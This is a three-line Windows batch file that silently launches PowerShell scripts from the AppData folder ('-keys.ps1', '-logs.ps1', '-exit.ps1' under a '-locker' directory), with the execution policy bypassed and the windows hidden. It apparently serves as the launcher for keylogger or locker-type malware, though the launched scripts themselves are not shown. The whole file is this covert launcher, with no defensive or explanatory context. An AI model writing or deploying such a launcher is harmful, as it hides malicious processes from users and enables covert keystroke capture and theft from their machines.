@echo off
powershell -ep bypass -w h Start-Process powershell.exe -windowstyle hidden  "$env:appdata/-locker/-keys.ps1"
powershell -ep bypass -w h Start-Process powershell.exe -windowstyle hidden  "$env:appdata/-locker/-logs.ps1"
powershell -ep bypass -w h Start-Process powershell.exe -windowstyle hidden  "$env:appdata/-exit.ps1"
